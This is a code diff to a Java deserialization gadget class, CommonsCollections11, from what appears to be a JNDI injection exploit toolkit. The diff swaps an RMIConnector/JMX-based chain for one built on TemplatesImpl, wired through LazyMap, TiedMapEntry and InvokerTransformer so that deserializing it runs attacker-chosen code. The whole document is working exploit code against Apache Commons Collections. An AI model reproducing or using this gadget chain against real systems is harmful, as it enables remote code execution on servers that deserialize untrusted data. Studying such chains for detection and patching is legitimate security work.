@@ -1,6 +1,7 @@
 package com.nu1r.jndi.gadgets;
 
 import com.nu1r.jndi.enumtypes.PayloadType;
+import com.nu1r.jndi.gadgets.utils.Gadgets;
 import com.nu1r.jndi.gadgets.utils.Reflections;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
@@ -21,20 +22,14 @@ public class CommonsCollections11 implements ObjectPayload<Object> {
 
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
-        String        command       = param[0];
-        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
-        Reflections.setFieldValue(jmxServiceURL, "urlPath", "/stub/" + command);
-        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
-
-        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
-
-        HashMap<Object, Object> map          = new HashMap<>();
-        Map<Object, Object>     lazyMap      = LazyMap.decorate(map, new ConstantTransformer(1));
-        TiedMapEntry            tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);
-
-        HashMap<Object, Object> expMap = new HashMap<>();
+        Object                  templates          = Gadgets.createTemplatesImpl(type, param);
+        InvokerTransformer      invokerTransformer = new InvokerTransformer("connect", null, null);
+        HashMap<Object, Object> map                = new HashMap<>();
+        Map<Object, Object>     lazyMap            = LazyMap.decorate(map, new ConstantTransformer(1));
+        TiedMapEntry            tiedMapEntry       = new TiedMapEntry(lazyMap, templates);
+        HashMap<Object, Object> expMap             = new HashMap<>();
         expMap.put(tiedMapEntry, "nu1r");
-        lazyMap.remove(rmiConnector);
+        lazyMap.remove(templates);
 
         Reflections.setFieldValue(lazyMap, "factory", invokerTransformer);
 
